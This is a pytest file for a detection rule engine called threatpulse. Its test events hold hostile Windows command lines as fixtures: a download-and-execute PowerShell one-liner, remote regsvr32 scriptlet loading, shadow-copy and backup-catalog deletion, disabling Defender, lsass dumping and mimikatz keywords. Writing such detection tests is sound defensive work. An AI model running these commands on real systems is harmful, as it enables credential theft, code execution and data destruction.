import os

import pytest

from threatpulse.rules import RuleSet, rule_from_dict
from threatpulse.rules.engine import RuleError, compile_detection, load_rules_from_path

from .conftest import ev

HERE = os.path.dirname(__file__)


def hits(rs, e):
    return sorted(r.id for r in rs.candidates(e) if r.type == "match" and r.matcher(e))


@pytest.fixture(scope="module")
def rs():
    rules, errors = RuleSet.load()
    assert errors == []
    return rules


def test_builtin_rules_compile(rs):
    ids = {r.id for r in rs.rules}
    for i in range(1, 11):
        assert any(x.startswith(f"TP-H{i:02d}") for x in ids), f"hypothesis {i} missing"


@pytest.mark.parametrize("cond,expect", [
    ("a and b", False), ("a or b", True), ("a and not b", True), ("not (a or b)", False),
    ("1 of sel*", True), ("all of sel*", False), ("1 of them", True), ("(a or b) and c", True),
])
def test_condition_grammar(cond, expect):
    det = {"a": {"x": "1"}, "b": {"x": "2"}, "c": {"y|contains": "ell"},
           "sel1": {"x": "1"}, "sel2": {"x": "9"}, "condition": cond}
    assert compile_detection(det)({"x": "1", "y": "hello"}) is expect


def test_modifiers():
    m = compile_detection({"s": {"CommandLine|contains|all": ["a", "b"], "Image|endswith": "\\x.exe",
                                 "N|gte": 5, "P|re": r"^ab\d+$"}, "condition": "s"})
    assert m({"CommandLine": "zaZb", "Image": "C:\\X.EXE", "N": "7", "P": "AB12"})
    assert not m({"CommandLine": "za", "Image": "C:\\X.EXE", "N": "7", "P": "AB12"})
    assert not m({"CommandLine": "ab", "Image": "C:\\X.EXE", "N": "3", "P": "AB12"})


def test_wildcards_and_keywords():
    m = compile_detection({"s": {"Image": "*\\power*.exe"}, "condition": "s"})
    assert m({"Image": "C:\\Windows\\PowerShell.exe"})
    k = compile_detection({"kw": ["mimikatz", "sekurlsa"], "condition": "kw"})
    assert k({"CommandLine": "x sekurlsa::logonpasswords"})


def test_bad_condition_raises():
    with pytest.raises(RuleError):
        compile_detection({"a": {"x": 1}, "condition": "a and missing"})
    with pytest.raises(RuleError):
        compile_detection({"a": {"x": 1}, "condition": "a | count() > 5"})


def test_sigma_rule_loads_and_matches():
    rules, errors = load_rules_from_path(os.path.join(HERE, "..", "examples", "sigma"))
    assert errors == [] and len(rules) == 1
    r = rules[0]
    assert r.source == "sigma" and "T1033" in r.mitre and ("sysmon", 1) in r.logsource
    bad = ev(EventID=1, Image="C:\\Windows\\System32\\whoami.exe", ParentImage="C:\\x\\powershell.exe",
             CommandLine="whoami /all")
    ok = ev(EventID=1, Image="C:\\Windows\\System32\\whoami.exe", ParentImage="C:\\x\\powershell.exe",
            CommandLine="powershell -File C:\\Scripts\\audit.ps1")
    assert r.matcher(bad) and not r.matcher(ok)


def test_security_4688_aliasing(rs):
    e = normalise_4688 = ev(Channel="Security", EventID=4688,
                            NewProcessName="C:\\Windows\\System32\\vssadmin.exe",
                            ParentProcessName="C:\\Windows\\System32\\cmd.exe",
                            CommandLine="vssadmin delete shadows /all /quiet")
    assert "TP-H08" in hits(rs, normalise_4688)
    assert e["tp_image"] == "vssadmin.exe"


@pytest.mark.parametrize("fields,rule", [
    (dict(EventID=1, ParentImage="C:\\Office16\\EXCEL.EXE", Image="C:\\Windows\\System32\\mshta.exe", CommandLine="mshta x"), "TP-H01"),
    (dict(EventID=10, SourceImage="C:\\Temp\\procdump64.exe", TargetImage="C:\\Windows\\system32\\lsass.exe", GrantedAccess="0x1fffff"), "TP-H02"),
    (dict(EventID=1, Image="C:\\pwsh.exe", CommandLine="pwsh -c iwr http://x/a.ps1 | iex"), "TP-H03"),
    (dict(EventID=1, Image="C:\\Windows\\System32\\regsvr32.exe", CommandLine="regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll"), "TP-H05"),
    (dict(EventID=13, Image="C:\\a.exe", TargetObject="HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\x"), "TP-H06"),
    (dict(Channel="System", EventID=7045, ServiceName="PSEXESVC"), "TP-H07"),
    (dict(EventID=1, Image="C:\\Windows\\System32\\wbadmin.exe", CommandLine="wbadmin delete catalog -quiet"), "TP-H08"),
    (dict(Channel="Security", EventID=1102), "TP-H09"),
    (dict(EventID=1, Image="C:\\Windows\\System32\\sc.exe", CommandLine="sc stop WinDefend"), "TP-H09"),
])
def test_hypothesis_positive(rs, fields, rule):
    assert rule in hits(rs, ev(**fields))


@pytest.mark.parametrize("fields", [
    dict(EventID=1, ParentImage="C:\\explorer.exe", Image="C:\\Windows\\System32\\cmd.exe", CommandLine="cmd"),
    dict(EventID=10, SourceImage="C:\\ProgramData\\MsMpEng.exe", TargetImage="C:\\Windows\\system32\\lsass.exe", GrantedAccess="0x1410"),
    dict(EventID=1, Image="C:\\powershell.exe", CommandLine="powershell -ep bypass -File C:\\Scripts\\x.ps1"),
    dict(EventID=13, Image="C:\\Windows\\System32\\msiexec.exe", TargetObject="HKLM\\...\\CurrentVersion\\Run\\Vendor"),
    dict(EventID=1, Image="C:\\Windows\\System32\\vssadmin.exe", CommandLine="vssadmin list shadows"),
])
def test_benign_not_flagged(rs, fields):
    assert hits(rs, ev(**fields)) == []


def test_drafts_not_loaded_by_default(tmp_path):
    (tmp_path / "drafts").mkdir()
    (tmp_path / "drafts" / "d.yml").write_text("id: D1\ntitle: d\nlogsource: {channel: sysmon, event_id: 1}\n"
                                               "detection: {s: {Image: x}, condition: s}\n")
    (tmp_path / "s.yml").write_text("id: S1\ntitle: s\nstatus: draft\nlogsource: {channel: sysmon, event_id: 1}\n"
                                    "detection: {s: {Image: x}, condition: s}\n")
    rules, _ = load_rules_from_path(str(tmp_path))
    assert rules == []
    rules, _ = load_rules_from_path(str(tmp_path), include_drafts=True)
    assert {r.id for r in rules} == {"D1", "S1"}


def test_unsupported_product_rejected():
    with pytest.raises(RuleError):
        rule_from_dict({"title": "x", "logsource": {"product": "linux", "category": "process_creation"},
                        "detection": {"s": {"Image": "x"}, "condition": "s"}})
